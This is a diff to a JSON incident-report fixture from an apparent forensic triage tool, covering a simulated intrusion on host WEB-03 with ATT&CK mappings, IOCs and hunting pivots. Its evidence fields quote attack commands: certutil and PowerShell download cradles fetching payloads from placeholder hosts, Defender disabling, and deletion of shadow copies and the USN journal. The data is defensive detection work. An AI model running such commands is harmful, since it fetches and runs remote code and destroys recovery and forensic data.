@@ -16,8 +16,8 @@
     "files": [
       {
         "name": "events.json",
-        "sha256": "91D79AECFAFF724FD38CE5752D32F5A2F7DCE27C70B53E5426F397DEE8735E06",
-        "count": 8
+        "sha256": "09BDFC1080182BACB3415B3CE261FCD98AEBE78902AA668A7E56F809A19E4E2D",
+        "count": 15
       },
       {
         "name": "registry.json",
@@ -61,8 +61,8 @@
       },
       {
         "name": "filesystem.json",
-        "sha256": "5F115336E42D813429778E6EADCD24BBAC52FA11F5E6EB9F8E6654695F8C1412",
-        "count": 5
+        "sha256": "9258ACC2CFC00FA6E1A2FB8F33DB92B30D95645CC5D9E3ACFCF1852E1CC0F52D",
+        "count": 7
       },
       {
         "name": "browser.json",
@@ -94,8 +94,8 @@
       "files": [
         {
           "name": "events.json",
-          "sha256": "91D79AECFAFF724FD38CE5752D32F5A2F7DCE27C70B53E5426F397DEE8735E06",
-          "count": 8
+          "sha256": "09BDFC1080182BACB3415B3CE261FCD98AEBE78902AA668A7E56F809A19E4E2D",
+          "count": 15
         },
         {
           "name": "registry.json",
@@ -139,8 +139,8 @@
         },
         {
           "name": "filesystem.json",
-          "sha256": "5F115336E42D813429778E6EADCD24BBAC52FA11F5E6EB9F8E6654695F8C1412",
-          "count": 5
+          "sha256": "9258ACC2CFC00FA6E1A2FB8F33DB92B30D95645CC5D9E3ACFCF1852E1CC0F52D",
+          "count": 7
         },
         {
           "name": "browser.json",
@@ -157,8 +157,8 @@
     "files": [
       {
         "name": "events.json",
-        "expected": "91D79AECFAFF724FD38CE5752D32F5A2F7DCE27C70B53E5426F397DEE8735E06",
-        "actual": "91D79AECFAFF724FD38CE5752D32F5A2F7DCE27C70B53E5426F397DEE8735E06",
+        "expected": "09BDFC1080182BACB3415B3CE261FCD98AEBE78902AA668A7E56F809A19E4E2D",
+        "actual": "09BDFC1080182BACB3415B3CE261FCD98AEBE78902AA668A7E56F809A19E4E2D",
         "ok": true
       },
       {
@@ -211,8 +211,8 @@
       },
       {
         "name": "filesystem.json",
-        "expected": "5F115336E42D813429778E6EADCD24BBAC52FA11F5E6EB9F8E6654695F8C1412",
-        "actual": "5F115336E42D813429778E6EADCD24BBAC52FA11F5E6EB9F8E6654695F8C1412",
+        "expected": "9258ACC2CFC00FA6E1A2FB8F33DB92B30D95645CC5D9E3ACFCF1852E1CC0F52D",
+        "actual": "9258ACC2CFC00FA6E1A2FB8F33DB92B30D95645CC5D9E3ACFCF1852E1CC0F52D",
         "ok": true
       },
       {
@@ -229,12 +229,12 @@
       }
     ]
   },
-  "summary": "INCIDENT BRIEF \u2014 WEB-03    Severity: Critical\n\nA hands-on-keyboard intrusion with established persistence, active C2, and deliberate anti-forensics. Treat as a confirmed compromise.\n\nKey findings:\n  \u2022 Initial execution via encoded PowerShell at 2026-05-02T09:12:00Z.\n  \u2022 2 suspicious persistence mechanism(s) (Run key / service).\n  \u2022 1 scheduled task(s) created for persistence.\n  \u2022 Local account(s) created: supportadmin.\n  \u2022 Outbound command-and-control to 203.0.113.45.\n  \u2022 Removable USB storage attached \u2014 potential exfiltration vector.\n  \u2022 Anti-forensics: the Security audit log was cleared (event 1102).\n\nATT&CK: 14 techniques across 6 tactics (T1059.001, T1547.001, T1543.003, T1053.005, T1136.001, T1036.005, T1218.011, T1562.001, T1070.001, T1071.001, T1052.001, T1546.003, T1105, T1204.002).",
+  "summary": "INCIDENT BRIEF \u2014 WEB-03    Severity: Critical\n\nA hands-on-keyboard intrusion with established persistence, active C2, and deliberate anti-forensics. Treat as a confirmed compromise.\n\nKey findings:\n  \u2022 Initial execution via encoded PowerShell at 2026-05-02T09:11:00Z.\n  \u2022 Living-off-the-land binary abuse: certutil, rundll32 (3 command(s)).\n  \u2022 Obfuscated/fileless execution: 4 command(s) flagged (1 base64-decoded).\n  \u2022 Anomalous process lineage: web server w3wp.exe spawned cmd.exe (web shell).\n  \u2022 2 suspicious persistence mechanism(s) (Run key / service).\n  \u2022 1 scheduled task(s) created for persistence.\n  \u2022 Local account(s) created: supportadmin.\n  \u2022 Outbound command-and-control to 203.0.113.45.\n  \u2022 Removable USB storage attached \u2014 potential exfiltration vector.\n  \u2022 Anti-forensics: Defender tampering (Set-MpPreference -Disable...); Security audit log cleared; USN change-journal deletion; VSS shadow-copy deletion.\n  \u2022 Timestomping detected on 1 file(s) (SI vs FN $MFT timestamps disagree).\n  \u2022 1 deleted file record(s) for suspect binaries recovered from $MFT (InUse=false).\n\nATT&CK: 22 techniques across 7 tactics (T1059.001, T1547.001, T1543.003, T1053.005, T1136.001, T1036.005, T1218.011, T1562.001, T1070.001, T1071.001, T1052.001, T1546.003, T1105, T1204.002, T1059.003, T1505.003, T1140, T1027, T1490, T1070, T1070.004, T1070.006).",
   "rootcause": {
     "host": "WEB-03",
     "root_cause": "Most likely root cause: a malicious executable (svchost.exe) downloaded through the web browser (http://cdn.example-update.test/svchost.exe) at 2026-05-02T09:10:00Z, then executed on the host. The dropper was first written to disk at 2026-05-02T09:10:05Z.",
     "root_cause_confidence": "high",
-    "summary": "Confirmed compromise of WEB-03: a 5-phase intrusion spanning 14 ATT&CK techniques. Most likely root cause: a malicious executable (svchost.exe) downloaded through the web browser (http://cdn.example-update.test/svchost.exe) at 2026-05-02T09:10:00Z, then executed on the host. The dropper was first written to disk at 2026-05-02T09:10:05Z.",
+    "summary": "Confirmed compromise of WEB-03: a 6-phase intrusion spanning 22 ATT&CK techniques. Most likely root cause: a malicious executable (svchost.exe) downloaded through the web browser (http://cdn.example-update.test/svchost.exe) at 2026-05-02T09:10:00Z, then executed on the host. The dropper was first written to disk at 2026-05-02T09:10:05Z.",
     "chain": [
       {
         "phase": "Execution",
@@ -242,15 +242,16 @@
         "techniques": [
           "T1059.001",
           "T1053.005",
-          "T1204.002"
+          "T1204.002",
+          "T1059.003"
         ],
         "evidence": [
+          "2026-05-02T09:11:00Z powershell.exe \u2014 encoded PowerShell download cradle",
           "2026-05-02T09:12:00Z powershell.exe \u2014 encoded PowerShell",
-          "powershell.exe powershell -nop -w hidden -enc SQBFAFgA",
-          "2026-05-02T09:18:00Z event 4698 \u2014 Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe",
-          "prefetch: svchost.exe ran 3x, last 2026-05-02T09:30:00Z (C:\\Users\\Public\\svchost.exe)"
+          "2026-05-02T09:38:00Z powershell.exe \u2014 Defender real-time monitoring disabled",
+          "powershell.exe powershell -nop -w hidden -enc SQBFAFgA"
         ],
-        "ts": "2026-05-02T09:12:00Z",
+        "ts": "2026-05-02T09:11:00Z",
         "confidence": "high"
       },
       {
@@ -260,7 +261,8 @@
           "T1547.001",
           "T1543.003",
           "T1136.001",
-          "T1546.003"
+          "T1546.003",
+          "T1505.003"
         ],
         "evidence": [
           "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run :: Updater=C:\\Users\\Public\\svchost.exe",
@@ -268,7 +270,7 @@
           "2026-05-02T09:13:00Z event 7045 \u2014 A new service was installed: FakeSvc",
           "2026-05-02T09:16:00Z event 4720 \u2014 A user account was created: supportadmin"
         ],
-        "ts": "2026-05-02T09:13:00Z",
+        "ts": "2026-05-02T09:11:30Z",
         "confidence": "high"
       },
       {
@@ -278,15 +280,20 @@
           "T1036.005",
           "T1218.011",
           "T1562.001",
-          "T1070.001"
+          "T1070.001",
+          "T1140",
+          "T1027",
+          "T1070",
+          "T1070.004",
+          "T1070.006"
         ],
         "evidence": [
           "svchost.exe C:\\Users\\Public\\svchost.exe",
           "2026-05-02T09:14:00Z rundll32.exe \u2014 proxied execution",
-          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender :: DisableAntiSpyware=1",
-          "2026-05-02T09:40:00Z event 1102 \u2014 The audit log was cleared"
+          "2026-05-02T09:14:00Z WEB-03 [event 4688]: rundll32.exe C:\\Users\\Public\\d.dll,Run [rundll32 proxy execution]",
+          "2026-05-02T09:14:00Z WEB-03 [processes.json]: rundll32.exe C:\\Users\\Public\\d.dll,Run [rundll32 proxy execution]"
         ],
-        "ts": "2026-05-02T09:14:00Z",
+        "ts": "2009-07-14T01:14:24Z",
         "confidence": "high"
       },
       {
@@ -298,9 +305,11 @@
         ],
         "evidence": [
           "svchost.exe -> 203.0.113.45:443",
-          "Chrome downloaded http://cdn.example-update.test/svchost.exe -> C:\\Users\\jdoe\\Downloads\\svchost.exe"
+          "Chrome downloaded http://cdn.example-update.test/svchost.exe -> C:\\Users\\jdoe\\Downloads\\svchost.exe",
+          "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe [certutil URLCache download]",
+          "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe"
         ],
-        "ts": "",
+        "ts": "2026-05-02T09:10:30Z",
         "confidence": "high"
       },
       {
@@ -315,6 +324,18 @@
         ],
         "ts": "2026-05-02T09:25:00Z",
         "confidence": "medium"
+      },
+      {
+        "phase": "Impact",
+        "title": "Impact",
+        "techniques": [
+          "T1490"
+        ],
+        "evidence": [
+          "2026-05-02T09:38:30Z WEB-03 [event 4688]: vssadmin.exe delete shadows /all /quiet [VSS shadow-copy deletion]"
+        ],
+        "ts": "2026-05-02T09:38:30Z",
+        "confidence": "medium"
       }
     ],
     "iocs": {
@@ -327,6 +348,7 @@
       ],
       "suspicious_paths": [
         "C:\\Users\\Public\\d.dll",
+        "C:\\Users\\Public\\stage2.exe",
         "C:\\Users\\Public\\svchost.exe",
         "C:\\Users\\jdoe\\Downloads\\svchost.exe",
         "C:\\Windows\\Temp\\f.exe"
@@ -343,40 +365,51 @@
         "203.0.113.45:443"
       ],
       "download_urls": [
+        "http://198.51.100.23/p.exe",
+        "http://198.51.100.23/stage.ps1",
+        "http://203.0.113.45/a",
         "http://cdn.example-update.test/svchost.exe"
       ]
     },
     "gaps": [
-      "The Security event log was cleared (T1070.001); earlier activity may be missing \u2014 correlate with forwarded logs / SIEM to recover the gap.",
+      "Visibility gap: Security audit log cleared at 2026-05-02T09:40:00Z on WEB-03; events before this are unavailable on-host \u2014 recover from forwarded logs / SIEM.",
+      "Volume Shadow Copies were deleted (T1490); on-host point-in-time recovery and $MFT/$LogFile carving from snapshots are no longer available.",
+      "The USN change journal was deleted (T1070); recent file create/rename/delete history is unrecoverable from the journal \u2014 rely on $MFT and forwarded telemetry.",
+      "Timestomping detected (T1070.006) on: C:\\Windows\\System32\\drivers\\update.sys \u2014 SI vs FN $MFT timestamps disagree, so on-disk MAC times are unreliable; pivot on FN (0x30) times instead.",
+      "Deleted $MFT record(s) for suspect file(s) (T1070.004): C:\\Users\\Public\\stage2.exe (InUse=false) \u2014 the attacker deleted the dropper; carve resident data from $MFT/$LogFile.",
       "C2 was observed as a live socket; pull proxy/DNS/firewall logs to scope the connection's duration and any data transferred.",
       "File-system timeline confirms the dropper's first write: C:\\Users\\jdoe\\Downloads\\svchost.exe at 2026-05-02T09:10:05Z (corroborate against $MFT $LogFile for resident-file recovery).",
       "WMI event-subscription persistence (T1546.003) was found; enumerate the whole root\\subscription namespace fleet-wide \u2014 it commonly survives reimaging of user data."
     ],
     "pivots": [
       "Hunt the fleet for any other host communicating with 203.0.113.45.",
+      "Block http://198.51.100.23/p.exe at the proxy and hunt other hosts that fetched it.",
+      "Block http://198.51.100.23/stage.ps1 at the proxy and hunt other hosts that fetched it.",
+      "Block http://203.0.113.45/a at the proxy and hunt other hosts that fetched it.",
       "Block http://cdn.example-update.test/svchost.exe at the proxy and hunt other hosts that fetched it.",
       "Acquire and analyze the binary at C:\\Users\\Public\\d.dll (hash, sandbox detonation, YARA).",
+      "Acquire and analyze the binary at C:\\Users\\Public\\stage2.exe (hash, sandbox detonation, YARA).",
       "Acquire and analyze the binary at C:\\Users\\Public\\svchost.exe (hash, sandbox detonation, YARA).",
-      "Acquire and analyze the binary at C:\\Users\\jdoe\\Downloads\\svchost.exe (hash, sandbox detonation, YARA).",
       "Audit logon history and group membership for account 'supportadmin' domain-wide.",
       "Remove the malicious WMI subscription (Remove-WmiObject on the filter, consumer, and binding) and sweep the fleet for the same consumer name.",
       "Submit collected hashes to threat intel and block at EDR."
     ],
     "attack": {
-      "techniques": 14,
-      "tactics": 6
+      "techniques": 22,
+      "tactics": 7
     }
   },
   "attack": {
-    "technique_count": 14,
-    "tactics_covered": 6,
+    "technique_count": 22,
+    "tactics_covered": 7,
     "tactics": [
       "Execution",
       "Persistence",
       "Privilege Escalation",
       "Defense Evasion",
       "Command and Control",
-      "Exfiltration"
+      "Exfiltration",
+      "Impact"
     ],
     "techniques": [
       {
@@ -385,9 +418,11 @@
         "tactics": [
           "Execution"
         ],
-        "count": 2,
+        "count": 4,
         "evidence": [
+          "2026-05-02T09:11:00Z powershell.exe \u2014 encoded PowerShell download cradle",
           "2026-05-02T09:12:00Z powershell.exe \u2014 encoded PowerShell",
+          "2026-05-02T09:38:00Z powershell.exe \u2014 Defender real-time monitoring disabled",
           "powershell.exe powershell -nop -w hidden -enc SQBFAFgA"
         ]
       },
@@ -457,9 +492,11 @@
         "tactics": [
           "Defense Evasion"
         ],
-        "count": 1,
+        "count": 3,
         "evidence": [
-          "2026-05-02T09:14:00Z rundll32.exe \u2014 proxied execution"
+          "2026-05-02T09:14:00Z rundll32.exe \u2014 proxied execution",
+          "2026-05-02T09:14:00Z WEB-03 [event 4688]: rundll32.exe C:\\Users\\Public\\d.dll,Run [rundll32 proxy execution]",
+          "2026-05-02T09:14:00Z WEB-03 [processes.json]: rundll32.exe C:\\Users\\Public\\d.dll,Run [rundll32 proxy execution]"
         ]
       },
       {
@@ -468,9 +505,10 @@
         "tactics": [
           "Defense Evasion"
         ],
-        "count": 1,
+        "count": 2,
         "evidence": [
-          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender :: DisableAntiSpyware=1"
+          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender :: DisableAntiSpyware=1",
+          "2026-05-02T09:38:00Z WEB-03 [event 4688]: powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true [Defender tampering (Set-MpPreference -Disable...)]"
         ]
       },
       {
@@ -479,9 +517,10 @@
         "tactics": [
           "Defense Evasion"
         ],
-        "count": 1,
+        "count": 2,
         "evidence": [
-          "2026-05-02T09:40:00Z event 1102 \u2014 The audit log was cleared"
+          "2026-05-02T09:40:00Z event 1102 \u2014 The audit log was cleared",
+          "2026-05-02T09:40:00Z WEB-03 event 1102: The audit log was cleared [Security audit log cleared]"
         ]
       },
       {
@@ -525,9 +564,13 @@
         "tactics": [
           "Command and Control"
         ],
-        "count": 1,
+        "count": 6,
         "evidence": [
-          "Chrome downloaded http://cdn.example-update.test/svchost.exe -> C:\\Users\\jdoe\\Downloads\\svchost.exe"
+          "Chrome downloaded http://cdn.example-update.test/svchost.exe -> C:\\Users\\jdoe\\Downloads\\svchost.exe",
+          "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe [certutil URLCache download]",
+          "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+          "2026-05-02T09:11:00Z WEB-03 [event 4688]: powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALg",
+          "2026-05-02T09:11:05Z WEB-03 [event 4104]: ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')"
         ]
       },
       {
@@ -543,11 +586,104 @@
           "shimcache: C:\\Users\\Public\\svchost.exe (present + executed)",
           "shimcache: C:\\Windows\\Temp\\f.exe (present + executed)"
         ]
+      },
+      {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "tactics": [
+          "Execution"
+        ],
+        "count": 1,
+        "evidence": [
+          "2026-05-02T09:11:30Z WEB-03 [event 4688]: w3wp.exe -> cmd.exe \u2014 web server w3wp.exe spawned cmd.exe (web shell)"
+        ]
+      },
+      {
+        "id": "T1505.003",
+        "name": "Server Software Component: Web Shell",
+        "tactics": [
+          "Persistence"
+        ],
+        "count": 1,
+        "evidence": [
+          "2026-05-02T09:11:30Z WEB-03 [event 4688]: w3wp.exe -> cmd.exe \u2014 web server w3wp.exe spawned cmd.exe (web shell)"
+        ]
+      },
+      {
+        "id": "T1140",
+        "name": "Deobfuscate/Decode Files or Information",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "count": 3,
+        "evidence": [
+          "2026-05-02T09:11:00Z WEB-03 [event 4688]: powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALg",
+          "2026-05-02T09:12:00Z WEB-03 [event 4688]: powershell -nop -w hidden -enc SQBFAFgA",
+          "2026-05-02T09:12:00Z WEB-03 [processes.json]: powershell -nop -w hidden -enc SQBFAFgA"
+        ]
+      },
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "count": 4,
+        "evidence": [
+          "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+          "2026-05-02T09:11:00Z WEB-03 [event 4688]: powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALg",
+          "2026-05-02T09:12:00Z WEB-03 [event 4688]: powershell -nop -w hidden -enc SQBFAFgA",
+          "2026-05-02T09:12:00Z WEB-03 [processes.json]: powershell -nop -w hidden -enc SQBFAFgA"
+        ]
+      },
+      {
+        "id": "T1490",
+        "name": "Inhibit System Recovery",
+        "tactics": [
+          "Impact"
+        ],
+        "count": 1,
+        "evidence": [
+          "2026-05-02T09:38:30Z WEB-03 [event 4688]: vssadmin.exe delete shadows /all /quiet [VSS shadow-copy deletion]"
+        ]
+      },
+      {
+        "id": "T1070",
+        "name": "Indicator Removal",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "count": 1,
+        "evidence": [
+          "2026-05-02T09:39:00Z WEB-03 [event 4688]: fsutil usn deletejournal /D C: [USN change-journal deletion]"
+        ]
+      },
+      {
+        "id": "T1070.004",
+        "name": "Indicator Removal: File Deletion",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "count": 1,
+        "evidence": [
+          "WEB-03 [$MFT]: deleted record C:\\Users\\Public\\stage2.exe (InUse=false, created 2026-05-02T09:15:00Z)"
+        ]
+      },
+      {
+        "id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "count": 1,
+        "evidence": [
+          "WEB-03 [$MFT]: C:\\Windows\\System32\\drivers\\update.sys \u2014 SI-created (2009-07-14T01:14:24Z) precedes FN-created (2026-05-02T09:13:00Z) \u2014 impossible naturally"
+        ]
       }
     ]
   },
   "counts": {
-    "events": 8,
+    "events": 15,
     "registry": 4,
     "processes": 4,
     "network": 2,
@@ -555,7 +691,7 @@
     "programs": 2,
     "prefetch": 4,
     "shimcache": 4,
-    "filesystem": 5,
+    "filesystem": 7,
     "browser": 3,
     "wmi": 1
   },
@@ -687,10 +823,37 @@
         "parent_process": "",
         "cmdline": "",
         "dst_ip": "",
-        "detail": "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"
+        "detail": "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe",
+        "logon_type": "",
+        "src_ip": "",
+        "src_host": ""
       }
     ],
     "events": [
+      {
+        "ts": "2026-05-02T09:10:30Z",
+        "event_id": 4688,
+        "process": "certutil.exe",
+        "detail": "certutil URLCache download"
+      },
+      {
+        "ts": "2026-05-02T09:11:00Z",
+        "event_id": 4688,
+        "process": "powershell.exe",
+        "detail": "encoded PowerShell download cradle"
+      },
+      {
+        "ts": "2026-05-02T09:11:05Z",
+        "event_id": 4104,
+        "process": "",
+        "detail": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')"
+      },
+      {
+        "ts": "2026-05-02T09:11:30Z",
+        "event_id": 4688,
+        "process": "cmd.exe",
+        "detail": "IIS worker spawned a shell (web shell)"
+      },
       {
         "ts": "2026-05-02T09:12:00Z",
         "event_id": 4688,
@@ -732,6 +895,24 @@
         "event_id": 6416,
         "process": "",
         "detail": "external device recognized: USBSTOR"
+      },
+      {
+        "ts": "2026-05-02T09:38:00Z",
+        "event_id": 4688,
+        "process": "powershell.exe",
+        "detail": "Defender real-time monitoring disabled"
+      },
+      {
+        "ts": "2026-05-02T09:38:30Z",
+        "event_id": 4688,
+        "process": "vssadmin.exe",
+        "detail": "shadow copies deleted"
+      },
+      {
+        "ts": "2026-05-02T09:39:00Z",
+        "event_id": 4688,
+        "process": "fsutil.exe",
+        "detail": "USN change journal deleted"
       },
       {
         "ts": "2026-05-02T09:40:00Z",
@@ -810,13 +991,30 @@
     ],
     "filesystem": [
       {
+        "path": "C:\\Windows\\System32\\drivers\\update.sys",
+        "name": "update.sys",
+        "created": "2009-07-14T01:14:24Z",
+        "modified": "2009-07-14T01:14:24Z",
+        "mft_modified": "2026-05-02T09:13:10Z",
+        "size": 24576,
+        "is_directory": false,
+        "fn_created": "2026-05-02T09:13:00Z",
+        "fn_modified": "2026-05-02T09:13:00Z",
+        "fn_record_change": "2026-05-02T09:13:10Z",
+        "deleted": false
+      },
+      {
         "path": "C:\\Users\\jdoe\\Documents\\notes.txt",
         "name": "notes.txt",
         "created": "2026-04-28T14:02:00Z",
         "modified": "2026-05-01T17:10:00Z",
         "mft_modified": "2026-05-01T17:10:00Z",
         "size": 840,
-        "is_directory": false
+        "is_directory": false,
+        "fn_created": "",
+        "fn_modified": "",
+        "fn_record_change": "",
+        "deleted": false
       },
       {
         "path": "C:\\Users\\jdoe\\Downloads\\svchost.exe",
@@ -825,7 +1023,11 @@
         "modified": "2026-05-02T09:10:05Z",
         "mft_modified": "2026-05-02T09:10:05Z",
         "size": 73216,
-        "is_directory": false
+        "is_directory": false,
+        "fn_created": "",
+        "fn_modified": "",
+        "fn_record_change": "",
+        "deleted": false
       },
       {
         "path": "C:\\Users\\Public\\svchost.exe",
@@ -834,7 +1036,11 @@
         "modified": "2026-05-02T09:11:50Z",
         "mft_modified": "2026-05-02T09:11:50Z",
         "size": 73216,
-        "is_directory": false
+        "is_directory": false,
+        "fn_created": "",
+        "fn_modified": "",
+        "fn_record_change": "",
+        "deleted": false
       },
       {
         "path": "C:\\Windows\\Temp\\f.exe",
@@ -843,7 +1049,11 @@
         "modified": "2026-05-02T09:12:50Z",
         "mft_modified": "2026-05-02T09:12:50Z",
         "size": 51200,
-        "is_directory": false
+        "is_directory": false,
+        "fn_created": "",
+        "fn_modified": "",
+        "fn_record_change": "",
+        "deleted": false
       },
       {
         "path": "C:\\Users\\Public\\d.dll",
@@ -852,7 +1062,24 @@
         "modified": "2026-05-02T09:13:40Z",
         "mft_modified": "2026-05-02T09:13:40Z",
         "size": 18944,
-        "is_directory": false
+        "is_directory": false,
+        "fn_created": "",
+        "fn_modified": "",
+        "fn_record_change": "",
+        "deleted": false
+      },
+      {
+        "path": "C:\\Users\\Public\\stage2.exe",
+        "name": "stage2.exe",
+        "created": "2026-05-02T09:15:00Z",
+        "modified": "2026-05-02T09:15:00Z",
+        "mft_modified": "2026-05-02T09:15:30Z",
+        "size": 40960,
+        "is_directory": false,
+        "fn_created": "2026-05-02T09:15:00Z",
+        "fn_modified": "2026-05-02T09:15:00Z",
+        "fn_record_change": "2026-05-02T09:15:30Z",
+        "deleted": true
       }
     ],
     "browser": [
@@ -889,6 +1116,265 @@
         "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
         "command": "C:\\Users\\Public\\svchost.exe"
       }
+    ],
+    "lolbins": [
+      {
+        "binary": "certutil",
+        "label": "certutil URLCache download",
+        "techniques": [
+          "T1105"
+        ],
+        "command": "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:10:30Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe"
+      },
+      {
+        "binary": "rundll32",
+        "label": "rundll32 proxy execution",
+        "techniques": [
+          "T1218.011"
+        ],
+        "command": "rundll32.exe C:\\Users\\Public\\d.dll,Run",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:14:00Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:14:00Z WEB-03 [event 4688]: rundll32.exe C:\\Users\\Public\\d.dll,Run"
+      },
+      {
+        "binary": "rundll32",
+        "label": "rundll32 proxy execution",
+        "techniques": [
+          "T1218.011"
+        ],
+        "command": "rundll32.exe C:\\Users\\Public\\d.dll,Run",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:14:00Z",
+        "source": "processes.json",
+        "provenance": "2026-05-02T09:14:00Z WEB-03 [processes.json]: rundll32.exe C:\\Users\\Public\\d.dll,Run"
+      }
+    ],
+    "command_intent": [
+      {
+        "command": "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe",
+        "decoded": "",
+        "intent": [
+          "download_cradle"
+        ],
+        "obfuscated": true,
+        "obfuscation": [
+          "char-array / join-split reassembly"
+        ],
+        "stealth_flags": [],
+        "techniques": [
+          "T1105",
+          "T1027"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:10:30Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:10:30Z WEB-03 [event 4688]: certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe"
+      },
+      {
+        "command": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA=",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')",
+        "intent": [
+          "download_cradle",
+          "in_memory_exec"
+        ],
+        "obfuscated": true,
+        "obfuscation": [
+          "base64-encoded command",
+          "high-entropy blob (4.1 bits)",
+          "very long single-line base64"
+        ],
+        "stealth_flags": [
+          "hidden window",
+          "no profile",
+          "execution-policy bypass"
+        ],
+        "techniques": [
+          "T1105",
+          "T1059.001",
+          "T1027",
+          "T1140"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:11:00Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:11:00Z WEB-03 [event 4688]: powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALg"
+      },
+      {
+        "command": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')",
+        "decoded": "",
+        "intent": [
+          "download_cradle",
+          "in_memory_exec"
+        ],
+        "obfuscated": false,
+        "obfuscation": [],
+        "stealth_flags": [],
+        "techniques": [
+          "T1105",
+          "T1059.001"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:11:05Z",
+        "source": "event 4104",
+        "provenance": "2026-05-02T09:11:05Z WEB-03 [event 4104]: ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1')"
+      },
+      {
+        "command": "powershell -nop -w hidden -enc SQBFAFgA",
+        "decoded": "",
+        "intent": [],
+        "obfuscated": true,
+        "obfuscation": [
+          "base64-encoded command"
+        ],
+        "stealth_flags": [
+          "hidden window",
+          "no profile"
+        ],
+        "techniques": [
+          "T1027",
+          "T1140"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:12:00Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:12:00Z WEB-03 [event 4688]: powershell -nop -w hidden -enc SQBFAFgA"
+      },
+      {
+        "command": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')",
+        "decoded": "",
+        "intent": [
+          "download_cradle",
+          "in_memory_exec"
+        ],
+        "obfuscated": false,
+        "obfuscation": [],
+        "stealth_flags": [],
+        "techniques": [
+          "T1105",
+          "T1059.001"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:12:05Z",
+        "source": "event 4104",
